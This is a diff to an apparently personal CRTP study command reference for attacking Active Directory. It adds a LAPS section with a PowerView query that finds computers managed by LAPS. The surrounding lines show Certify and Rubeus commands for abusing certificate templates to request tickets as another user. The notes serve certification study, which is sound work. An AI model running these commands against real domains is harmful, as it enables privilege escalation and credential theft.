@@ -59,6 +59,7 @@
 - [MS SQL](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#ms-sql)
 - [Forest Persistence - DC Shadow](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#forest-persistence---dcshadow)
 - [Certificates](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#certificates)
+- LAPS
 
 # Powershell Basics
 
@@ -1590,3 +1591,8 @@ Full Control means set ```CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT``` and remove the ``
 ```Certify.exe request /ca:dc.ecorcp.com\ecorp-dc-ca /template:user```
 
 ```./Rubeus.exe asktgt /user:localadmin /certificate:C:\Temp\hi.pfx /password:Password01```
+
+# LAPS
+```Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName```
+
+
